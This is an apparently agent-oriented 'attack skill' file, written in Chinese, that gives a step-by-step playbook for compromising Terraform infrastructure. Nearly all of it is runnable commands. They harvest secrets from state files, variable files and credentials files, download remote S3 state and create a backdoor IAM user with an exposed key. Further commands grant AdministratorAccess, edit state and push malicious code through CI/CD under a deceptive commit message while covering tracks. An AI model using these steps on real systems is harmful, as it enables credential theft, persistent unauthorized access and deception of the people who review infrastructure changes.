---
name: terraform-attack
type: attack
category: iac
platform: terraform
severity: high
---

# Terraform 攻击技能

## 触发条件

- 发现 Terraform 配置或 State
- 有访问 Terraform 文件的权限
- 用户要求"攻击 Terraform"

## 前置检查

```bash
# 1. 查找 Terraform 文件
find . -name "*.tf" -o -name "terraform.tfstate" -o -name ".terraform"

# 2. 检查 State 文件
cat terraform.tfstate | jq -r '.resources[].type'

# 3. 列出管理的资源
terraform show
```

## 攻击方法

### 方法 1: State 文件窃取

```bash
# 1. 查找 State 文件
find . -name "terraform.tfstate" -o -name "*.tfstate"

# 2. 读取 State 文件
cat terraform.tfstate | jq '.'

# 3. 提取敏感信息
cat terraform.tfstate | jq -r '.resources[].instances[].attributes'

# 4. 搜索凭证
grep -r -i "password\|secret\|token\|api_key" terraform.tfstate
```

### 方法 2: 远程 State 利用

```bash
# 1. 如果使用 S3 Backend
cat backend.tf | grep -A 10 'backend "s3"'

# 2. 下载 State 文件
aws s3 cp s3://BUCKET_NAME/PATH/terraform.tfstate /tmp/

# 3. 列出所有 State 文件
aws s3 ls s3://BUCKET_NAME/PATH/

# 4. 如果使用其他 Backend
# - Consul: consul kv get terraform/STATE
# - HTTP: curl STATE_URL
# - Azure Blob: az storage blob download
```

### 方法 3: 密钥提取

```bash
# 1. 从 State 中提取 AWS 凭证
cat terraform.tfstate | jq -r '.resources[] | select(.type=="aws_iam_access_key").instances[].attributes.secret'

# 2. 提取数据库密码
cat terraform.tfstate | jq -r '.resources[] | select(.type=="aws_db_instance").instances[].attributes.password'

# 3. 提取所有字符串属性
cat terraform.tfstate | jq -r '.resources[].instances[].attributes | to_entries[] | select(.value | type=="string") | .value'

# 4. 提取变量
terraform output
terraform output -json | jq 'to_entries[] | select(.value | type=="object")'
```

### 方法 4: Provider 凭证利用

```bash
# 1. 检查 .tfrc 文件（包含 Token）
cat ~/.terraformrc
cat .terraformrc

# 2. 检查环境变量
env | grep -i tf_
env | grep -i terraform

# 3. 检查凭证文件
cat ~/.terraform.d/credentials.tfrc.json

# 4. 提取 API Token
cat ~/.terraform.d/credentials.tfrc.json | jq -r '.credentials["app.terraform.io"].token'
```

### 方法 5: Output 利用

```bash
# 1. 获取所有输出
terraform output

# 2. 获取敏感输出
terraform output -json | jq 'to_entries[] | select(.key | test("sensitive|password|secret"; "i"))'

# 3. 如果输出被标记为 sensitive
# 可以直接从 State 读取
cat terraform.tfstate | jq -r '.outputs[] | select(.sensitive==true)'

# 4. 强制输出敏感值
terraform output -raw sensitive_output_name
```

### 方法 6: 变量文件利用

```bash
# 1. 查找变量文件
find . -name "*.tfvars" -o -name "terraform.tfvars"

# 2. 读取变量文件
cat terraform.tfvars
cat *.tfvars

# 3. 搜索敏感变量
grep -r -i "password\|secret\|token\|api_key" *.tfvars

# 4. 检查 .auto.tfvars 文件
find . -name "*.auto.tfvars"
```

### 方法 7: 资源注入

```bash
# 1. 创建恶意资源
cat > malicious.tf <<'EOF'
resource "aws_iam_user" "attacker" {
  name = "attacker-backdoor"
}

resource "aws_iam_access_key" "attacker" {
  user = aws_iam_user.attacker.name
}

output "attacker_key" {
  value = aws_iam_access_key.attacker.secret
}
EOF

# 2. 应用配置
terraform apply -auto-approve

# 3. 获取输出
terraform output attacker_key

# 4. 清除痕迹
# 创建其他合法资源掩盖后门
```

### 方法 8: 配置篡改

```bash
# 1. 修改现有资源
# 添加后门用户
cat > backend.tf <<'EOF'
resource "aws_iam_user_policy_attachment" "backdoor" {
  user       = "legitimate-user"
  policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"
}
EOF

# 2. 修改 State 文件
# 直接编辑 tfstate（危险但有效）
jq '.resources[].instances[].attributes.admin = true' terraform.tfstate > tmp.tfstate
mv tmp.tfstate terraform.tfstate

# 3. 应用修改
terraform apply -auto-approve
```

### 方法 9: Module 利用

```bash
# 1. 列出所有模块
cat terraform.tfstate | jq -r '.resources[] | select(.type=="module").source'

# 2. 检查模块源
# 可能在私有 Registry 或 Git 仓库

# 3. 访问私有模块
# 如果使用 Git，可能包含凭证

# 4. 注入恶意模块
# 创建包含后门的 Module Registry
```

### 方法 10: CI/CD Pipeline 利用

```bash
# 1. 检查 CI/CD 配置
ls -la .gitlab-ci.yml
ls -la .github/workflows/*.yml

# 2. 搜索 Terraform 命令
grep -r "terraform" .gitlab-ci.yml

# 3. 检查自动 apply
# 如果 CI/CD 自动执行 terraform apply
# 可以通过 PR 注入恶意代码

# 4. 提交恶意变更
git add malicious.tf
git commit -m "Add security monitoring"
git push
```

## 验证成功

```bash
# 成功读取 State
terraform show

# 成功提取密钥
cat terraform.tfstate | jq -r '.resources[].instances[].attributes | to_entries[] | select(.value | type=="string")'

# 成功列出输出
terraform output
```

## 下一步

1. 分析窃取的凭证和密钥
2. 使用获取的凭证访问云资源
3. 通过 Terraform 建立持久化后门
4. 攻击 Terraform 代码仓库
